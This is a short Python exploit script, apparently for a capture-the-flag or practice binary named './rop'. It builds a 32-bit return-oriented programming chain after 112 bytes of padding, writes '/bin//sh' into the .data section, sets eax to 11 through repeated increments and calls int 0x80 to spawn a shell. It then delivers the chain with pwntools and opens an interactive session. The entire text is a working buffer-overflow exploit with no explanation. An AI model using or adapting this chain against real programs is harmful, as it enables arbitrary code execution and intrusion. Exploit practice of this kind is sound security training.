from struct import pack

# Padding goes here
p = 'a'*112
p += pack('<I', 0x0806ee0a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080b7fb6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805483b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee0a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080b7fb6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805483b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492e3) # xor eax, eax ; ret
p += pack('<I', 0x0805483b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080de6b1) # pop ecx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x0806ee0a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080492e3) # xor eax, eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0807a64f) # inc eax ; ret
p += pack('<I', 0x0806ca85) # int 0x80

from pwn import *
context.log_level = "debug"
io = process("./rop")
io.sendline(p)
io.interactive()
